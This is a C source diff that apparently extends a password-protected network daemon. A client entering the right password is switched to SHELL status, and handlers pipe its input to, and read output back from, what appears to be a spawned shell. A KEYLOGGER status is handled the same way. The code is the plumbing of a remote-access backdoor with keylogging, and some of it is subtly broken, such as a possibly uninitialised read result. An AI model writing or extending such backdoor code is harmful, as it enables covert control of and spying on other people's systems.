@@ -49,6 +49,7 @@ void	handle_handshake(t_server *server, int index, char *input) {
 		if (search_password(server, input) == true)
 		{
 			shell_function(server, index);
+			client->status = SHELL;
 			return ;
 		}
 		if (check_server_password(server, input) == false)
@@ -124,6 +125,32 @@ int	handle_commands(t_server *server, int index, char *input)
 	return (0);
 }
 
+int	handle_inpipe(t_server *server, int index, char *input)
+{
+	const t_client	*client = &server->clients[index];
+	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->rfds))
+	{
+		write(client->inpipe_fd, input, strlen(input));
+	}
+	return 0;
+}
+
+int	extract_outpipe(t_server *server, int index)
+{
+	char buffer[4096] = {0};
+	int			r;
+	t_client	*client = &server->clients[index];
+	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))
+	{
+		r = read(client->outpipe_fd, buffer, 4095);
+	}
+	if (r > 0)
+		client->response_bffr = ft_strdup(buffer);
+	else
+		client->response_bffr = ft_strdup("errooooor\n");
+	return 0;
+}
+
 int	handle_input(t_server *server, int index, char *buffer)
 {
 	const t_client	*client = &server->clients[index];
@@ -135,6 +162,8 @@ int	handle_input(t_server *server, int index, char *buffer)
 		handle_handshake(server, index, input);
 	else if (client->status == CONNECTED)
 		fd = handle_commands(server, index, input);
+	else if (client->status == SHELL || client->status == KEYLOGGER)
+		fd = handle_inpipe(server, index, buffer);
 	free(input);
 	return (fd);
 }
